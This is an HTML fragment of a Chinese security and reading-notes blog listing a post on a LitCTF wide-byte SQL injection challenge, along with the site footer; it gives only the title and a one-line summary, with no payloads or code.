href="/fuguang-notes/posts/litctf-widebyte-sqli/" style="--row-accent:#3ecf8e"><span class="post-index">03</span><div class="post-row-main"><div class="post-row-meta"><span>技术</span><time datetime="2026-07-28T00:00:00.000Z">2026/07/28</time></div><h3>一次宽字节注入的完整复盘：从字符串型判断到 UNION 绕过</h3><p>LitCTF 的一道 EasySql，把判断注入类型、识别转义防御、宽字节绕过和 UNION 取数四个环节完整走了一遍。</p></div><span class="post-row-time">3 min</span><span class="post-row-arrow" aria-hidden="true">↗</span></a></div></section></main><footer class="site-footer"><div class="shell footer-grid"><div class="footer-intro"><span class="brand-mark" aria-hidden="true">浮</span><div><strong>浮光note</strong><p>安全技术、CTF 复盘与读书笔记，记录那些值得再想一遍的问题。</p></div></div><div class="footer-links"><div><strong>浏览</strong><a href="/fuguang-notes/category/tech/">技术</a><a href="/fuguang-notes/category/life/">生活</a><a href="/fuguang-notes/category/reading/">读书</a><a href="/fuguang-notes/category/gaming/">游戏</a></div><div><strong>更多</strong><a href="/fuguang-notes/archive/">文章归档</a><a href="/fuguang-notes/about/">关于作者</a><a href="/fuguang-notes/rss.xml">RSS 订阅</a><a href="mailto:theologian25@qq.com">邮件联系</a></div></div></div><div class="shell footer-bottom"><span>© 2026 Theologian25 · 愚者</span><span>认真写作，缓慢更新。</span></div></footer></body></html>
